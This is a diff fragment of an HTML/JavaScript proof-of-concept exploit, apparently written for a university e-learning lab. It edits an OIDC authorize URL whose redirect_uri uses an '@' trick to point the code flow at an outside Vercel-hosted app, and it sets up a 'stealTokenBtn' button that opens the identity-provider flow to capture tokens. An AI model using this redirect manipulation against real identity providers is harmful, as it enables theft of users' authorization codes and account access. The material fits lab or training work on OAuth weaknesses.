@@ -32,7 +32,7 @@
   <script>
     // Change this URL to match the *exact* vulnerable flow request:
     const authorizeUrl = 
-      "https://idp-elearning.cloud.nds.rub.de/oidc_idp/authorize/index.xhtml?scope=profile+email+calendar+passwords+photos&response_type=code&redirect_uri=https://sp-elearning.cloud.nds.rub.de:443/oidc_sp/spa/verify%40https%2F%2Fsp%2Delearningcloudndsrubde%2Evercel%2Eapp%2F&state=2XAfEKOmgzUxiqROs4FIQA&code_challenge_method=S256&client_id=spa-1&code_challenge=UISu9LnOjqyKgwT31tEbPxYOtf7Uvmwfy821Z9a80Yg&response_mode=web_message&idp_verifier=spa-s1";
+      "https://idp-elearning.cloud.nds.rub.de/oidc_idp/authorize/index.xhtml?scope=profile+email+calendar+passwords+photos&response_type=code&redirect_uri=https%3A%2F%2Fsp-elearning.cloud.nds.rub.de%3A443%2Foidc_sp%2Fspa%2Fverify%40https%2F%2Fsp%2Delearningcloudndsrubde%2Evercel%2Eapp%2F&state=2XAfEKOmgzUxiqROs4FIQA&code_challenge_method=S256&client_id=spa-1&code_challenge=UISu9LnOjqyKgwT31tEbPxYOtf7Uvmwfy821Z9a80Yg&response_mode=web_message&idp_verifier=spa-s1";
 
     // Open the IdP flow in a new window.
     document.getElementById("stealTokenBtn").addEventListener("click", () => {
